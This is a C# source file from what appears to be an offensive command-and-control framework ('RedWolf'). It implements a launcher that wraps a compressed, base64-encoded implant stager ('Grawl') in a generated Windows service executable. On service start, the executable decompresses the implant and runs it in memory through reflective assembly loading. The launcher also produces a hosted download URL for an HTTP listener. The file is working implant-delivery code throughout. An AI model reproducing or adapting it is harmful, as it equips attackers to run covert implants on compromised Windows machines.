// Author: Ryan Cobb (@cobbr_io)
// Project: RedWolf (https://github.com/cobbr/RedWolf)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using RedWolf.Core;
using RedWolf.Models.Grawls;
using RedWolf.Models.Listeners;

namespace RedWolf.Models.Launchers
{
    public class ServiceBinaryLauncher : DiskLauncher
    {
        public ServiceBinaryLauncher()
        {
            this.Name = "ServiceBinary";
            this.Type = LauncherType.ServiceBinary;
            this.Description = "Uses a generated .NET Framework Service binary to launch a Grawl.";
            this.OutputKind = OutputKind.ConsoleApplication;
            this.CompressStager = true;
        }

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grawl grawl, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
            
            var code = CodeTemplate.Replace("{{GRAWL_IL_BYTE_STRING}}", this.Base64ILByteString);
            
            var references = grawl.DotNetVersion == Common.DotNetVersion.Net35 ? Common.DefaultNet35References : Common.DefaultNet40References;
            references.Add(new Compiler.Reference
            {
                File = grawl.DotNetVersion == Common.DotNetVersion.Net35 ? Common.RedWolfAssemblyReferenceNet35Directory + "System.ServiceProcess.dll" : Common.RedWolfAssemblyReferenceNet40Directory + "System.ServiceProcess.dll",
                Framework = grawl.DotNetVersion,
                Enabled = true
            });

            this.DiskCode = Convert.ToBase64String(Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
            {
                Language = template.Language,
                Source = code,
                TargetDotNetVersion = grawl.DotNetVersion,
                OutputKind = OutputKind.ConsoleApplication,
                References = references
            }));

            this.LauncherString = string.Format("{0}{1}.exe", template.Name, "SVC");
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            var httpListener = listener as HttpListener;

            if (httpListener != null)
            {
                var location = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                this.LauncherString = hostedFile.Path.Split("\\").Last().Split("/").Last();
                return location.ToString();
            }
            else
            {
                return "";
            }
        }

        private static readonly string CodeTemplate =
@"using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.ServiceProcess;
using System.Threading;

namespace Grawl
{
    static class Program
    {
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[] { new Service() };
            ServiceBase.Run(ServicesToRun);
        }
    }

    public partial class Service : ServiceBase
    {
        public Service()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            var oms = new MemoryStream();
            var ds = new DeflateStream(new MemoryStream(Convert.FromBase64String(""{{GRAWL_IL_BYTE_STRING}}"")), CompressionMode.Decompress);
            var by = new byte[1024];
            var r = ds.Read(by, 0, 1024);

            while (r > 0)
            {
                oms.Write(by, 0, r);
                r = ds.Read(by, 0, 1024);
            }

            new Thread(delegate()
            {
                Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[] { } });
            }).Start();   
        }

        protected override void OnStop() {}
    }

    partial class Service
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }

            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            this.ServiceName = ""Service"";
        }
    }
}";
    }
}
